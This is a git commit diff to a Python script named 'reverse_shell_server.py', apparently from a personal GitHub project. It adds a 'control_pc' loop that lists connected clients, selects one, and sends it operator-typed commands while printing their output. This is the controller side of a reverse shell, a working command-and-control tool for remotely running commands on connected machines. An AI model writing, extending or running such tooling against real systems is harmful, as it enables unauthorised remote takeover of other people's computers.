036afea42321e794f23c6eace0c0edb8a5e0e808
AGNEESHWARAN <32772085+AGNEESHWARAN@users.noreply.github.com>
2021-07-28 17:13:50 +0530

    Update reverse_shell_server.py

--- reverse_shell_server.py
+++ reverse_shell_server.py
@@ -19,17 +19,28 @@ def accept_conn():
 		conn_lis.append(conn)
 
 
-def do_something():
+def control_pc():
 	while True:
 		print("LIST OF CONNECTIONS :")
 		
 		for i in add_lis:
 			print(add_lis.index(i),i[0],i[1])
 		selection = input(" select connection >>>")
-		if selection =='cont':
+		if selection =='skip':
 			continue
+		conn = conn_lis[int(selection)]
+		while True:
+			cmd=input('>>')
+			if cmd=='end' or cmd=='END':
+				break
+			conn.sendall(str.encode(cmd))
+			response = str(conn.recv(40820),'utf-8')
+			print(response)
+
+
+
 t = threading.Thread(target=accept_conn)
-t1=threading.Thread(target=do_something)
+t1=threading.Thread(target=control_pc)
 
 
 
@@ -39,4 +50,3 @@ t1.join()
 t.join()
 
 print("end..")
-
